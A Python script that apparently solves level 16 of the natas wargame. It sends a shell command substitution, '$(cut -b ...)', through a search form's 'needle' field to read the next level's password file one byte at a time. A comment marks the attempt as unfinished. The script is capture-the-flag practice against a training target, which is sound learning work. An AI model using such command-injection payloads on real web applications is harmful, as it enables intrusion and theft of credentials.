"""
natas16: shell injection, more filtering
"""

import requests
import urllib.parse
from bs4 import BeautifulSoup
from typing import List, Optional

from natas_utils import *

LEVEL = 16

def solve(url: str, login: LevelLogin) -> Optional[str]:
    flag_file_abspath = NATAS_DATA['flag_path'] + f"natas{LEVEL + 1}"

    # the `cut` utility allows extraction of single bytes per line
    # using 1-indexed offsets
    i = 3
    payload = f"^$(cut -b {i} {flag_file_abspath})"

    params = {
        "needle": payload,
        "submit": "Search",
    }
    print(params)
    response = requests.get(url, auth=login, params=params)
    print(response.text)

    results = get_grep_output(response)
    print(results)

    # this will fail
    return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))

def get_grep_output(response: requests.Response) -> List[str]:
    soup = BeautifulSoup(response.text, "html.parser")

    # results are in the only <pre> element on the page, one word per line
    return soup.find("pre").text.split()

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))